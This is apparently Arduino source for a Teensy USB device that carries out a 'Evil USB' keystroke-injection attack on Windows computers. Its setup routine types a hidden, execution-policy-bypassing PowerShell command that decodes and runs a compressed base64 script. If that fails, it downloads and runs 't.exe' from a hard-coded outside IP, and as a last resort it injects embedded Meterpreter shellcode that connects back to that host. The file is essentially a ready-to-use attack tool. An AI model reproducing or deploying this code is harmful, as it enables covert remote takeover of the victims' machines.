// This code is to set up the Evil USB attack on a Teensy 3.1 device.
// By Josh Hale "sn0wfa11"
// With use of the EvilUSB functions.

// Set the LED pin
const int led = 13; // Teensy 3.2 has LED on 13

// Powershell command to download, execute, and delete the payload script.  Encoded and compressed to try to hide ip and port information.
char command1[] = "powershell.exe -Nop -NonI -W Hidden -Exec Bypass -Command \"$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAL+a7FYCAz2OsQ6CMBRFf+UNTdAorxZiMTRMGuPk4uDiAuURMbQ1+hD9e+vieG7OTY6wlacpDc2NLMPp82RyeCTGMzXboSfPBsQIFSRX5nsppSpyzHJUWqHa6FJlq7WWjE3NSTS7aIpDcAQLSC7/2eIuTH4IdbvvB5qJcSm6uQHrWqQ3gbTxaeBBLrwo7WPCj79zDxlJmwAAAA=='));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();\"";

// Meterpreter Payload and .NET version - This is for the C# attack vector
char payload[] = "0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x1,0xd1,0x51,0x8b,0x59,0x20,0x1,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xff,0xac,0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf6,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x6e,0x65,0x74,0x0,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x7,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x3,0x53,0x53,0x68,0xd0,0x32,0x0,0x0,0xe8,0x8c,0x0,0x0,0x0,0x2f,0x33,0x70,0x44,0x41,0x34,0x0,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x0,0x32,0xe0,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0xa,0x5f,0x68,0x80,0x33,0x0,0x0,0x89,0xe0,0x6a,0x4,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x6,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0xa,0x4f,0x75,0xd9,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x40,0x68,0x0,0x10,0x0,0x0,0x68,0x0,0x0,0x40,0x0,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x0,0x20,0x0,0x0,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcd,0x8b,0x7,0x1,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x75,0xff,0xff,0xff,0x31,0x37,0x33,0x2e,0x32,0x33,0x2e,0x31,0x36,0x31,0x2e,0x31,0x38,0x36,0x0";
char net_ver[] = "4";

void setup() 
{
  // set stuff up
  pinMode(led, OUTPUT);
  bool connect_good = false;
  
  // Connect indicator and wait for drivers.
  led_blink(5,80);
  wait_for_drivers(2000, 5000);

  // Start the attack using powershell
  morse_code("go");
  run_and_hide(command1);
  
  if (numlock_success(75, 500)) // Check if powershell was successfull
  {
    connect_good = true;
    led_blink(3, 500);
  }

  if (!connect_good) // If not try vbscript instead
  {
    morse_code("go");
    vbscript_run_and_hide("http://173.23.161.186:12056/", "t.exe");
    if (numlock_success(75, 500))
    {
      connect_good = true;
      led_blink(3, 500);
    }
  }

  if (!connect_good) // If still not, try a cs attack
  {
    morse_code("go");
    cs_run_and_hide(payload, net_ver);
    if (numlock_success(120, 500))
      led_blink(3,500);
  }
}

void loop() {}
